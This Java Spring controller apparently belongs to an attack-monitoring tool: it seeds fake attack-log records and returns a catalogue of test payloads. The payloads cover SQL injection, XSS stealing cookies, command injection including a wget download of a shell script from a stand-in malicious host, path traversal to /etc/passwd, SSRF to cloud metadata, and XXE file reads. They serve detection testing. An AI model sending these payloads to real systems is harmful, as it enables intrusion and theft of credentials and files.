package org.cyberwatch.controller;

import org.cyberwatch.model.AttackLog;
import org.cyberwatch.repository.AttackLogRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;

@RestController
@RequestMapping("/test/data")
public class TestDataController {

    @Autowired
    private AttackLogRepository attackLogRepository;

    private final Random random = new Random();
    private final String[] attackTypes = {
            "SQL_INJECTION", "XSS", "BRUTE_FORCE", "COMMAND_INJECTION",
            "PATH_TRAVERSAL", "SSRF", "XXE", "LOG_INJECTION"
    };
    private final String[] sourceIps = {"192.168.1.100", "10.0.0.50", "172.16.0.25", "203.0.113.45", "198.51.100.12"};

    @PostMapping("/generate-sample-attacks")
    public ResponseEntity<Map<String, Object>> generateSampleAttacks(
            @RequestParam(defaultValue = "50") int count) {

        for (int i = 0; i < count; i++) {
            AttackLog log = new AttackLog();
            log.setAttackType(attackTypes[random.nextInt(attackTypes.length)]);
            log.setSourceIp(sourceIps[random.nextInt(sourceIps.length)]);
            log.setDescription("Sample attack #" + (i + 1));
            log.setTargetEndpoint("/test/vulnerable-endpoint");
            log.setRequestMethod(random.nextBoolean() ? "GET" : "POST");
            log.setSeverity(AttackLog.Severity.values()[random.nextInt(4)]);
            log.setDetectedAt(LocalDateTime.now().minusMinutes(random.nextInt(1440))); // Random time within the last 24 hours
            log.setBlocked(random.nextBoolean());

            attackLogRepository.save(log);
        }

        Map<String, Object> response = new HashMap<>();
        response.put("message", "Sample attacks generated successfully");
        response.put("count", count);

        return ResponseEntity.ok(response);
    }

    @GetMapping("/attack-simulation-urls")
    public ResponseEntity<Map<String, Object>> getAttackSimulationUrls() {
        Map<String, Object> urls = new LinkedHashMap<>();

        // --- SQL Injection (SQLi) ---
        Map<String, String> sqlInjection = new LinkedHashMap<>();
        sqlInjection.put("basic_auth_bypass", "/api/users?id=' OR 1=1 -- ");
        sqlInjection.put("union_based", "/api/products?id=1' UNION SELECT username, password FROM users -- ");
        sqlInjection.put("error_based", "/api/items?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- ");
        sqlInjection.put("time_based_blind", "/api/search?q=1'; IF(1=1) WAITFOR DELAY '0:0:5' -- ");
        urls.put("sql_injection", sqlInjection);

        // --- Cross-Site Scripting (XSS) ---
        Map<String, String> xss = new LinkedHashMap<>();
        xss.put("basic_script", "/comment?text=<script>alert('XSS')</script>");
        xss.put("img_onerror", "/profile/avatar?url=x' onerror='alert(document.cookie)");
        xss.put("svg_onload", "/file/upload?name=<svg/onload=alert(1)>");
        xss.put("javascript_protocol", "/redirect?url=javascript:alert('XSS')");
        urls.put("xss", xss);

        // --- Command Injection ---
        Map<String, String> commandInjection = new LinkedHashMap<>();
        commandInjection.put("basic_unix", "/tools/ping?host=8.8.8.8; ls -la");
        commandInjection.put("basic_windows", "/tools/ping?host=8.8.8.8 & dir");
        commandInjection.put("remote_download", "/tools/diagnose?target=; wget http://malicious.com/shell.sh");
        urls.put("command_injection", commandInjection);

        // --- Path/Directory Traversal ---
        Map<String, String> pathTraversal = new LinkedHashMap<>();
        pathTraversal.put("read_passwd", "/files/download?file=../../../../etc/passwd");
        pathTraversal.put("read_windows_boot", "/files/download?file=..\\..\\..\\boot.ini");
        pathTraversal.put("null_byte", "/files/download?file=../../../../etc/passwd%00.jpg");
        urls.put("path_traversal", pathTraversal);

        // --- Server-Side Request Forgery (SSRF) ---
        Map<String, String> ssrf = new LinkedHashMap<>();
        ssrf.put("aws_metadata", "/proxy/image?url=http://169.254.169.254/latest/meta-data/");
        ssrf.put("internal_port_scan", "/proxy/image?url=http://localhost:8080/admin");
        ssrf.put("file_protocol", "/proxy/image?url=file:///etc/passwd");
        urls.put("server_side_request_forgery", ssrf);

        // --- XML External Entity (XXE) Injection ---
        Map<String, String> xxe = new LinkedHashMap<>();
        xxe.put("payload_info", "This is a POST request. The payload should be in the request body.");
        xxe.put("file_exfiltration_payload", "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>");
        xxe.put("ssrf_payload", "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://internal.service/status\">]><data>&xxe;</data>");
        urls.put("xml_external_entity", xxe);

        // --- Brute Force ---
        Map<String, String> bruteForce = new LinkedHashMap<>();
        bruteForce.put("endpoint", "/auth/login");
        bruteForce.put("method", "POST");
        bruteForce.put("info", "Requires repeated POST requests with different credentials.");
        bruteForce.put("example_payload", "{\"username\": \"admin\", \"password\": \"password123\"}");
        urls.put("brute_force", bruteForce);

        return ResponseEntity.ok(urls);
    }
}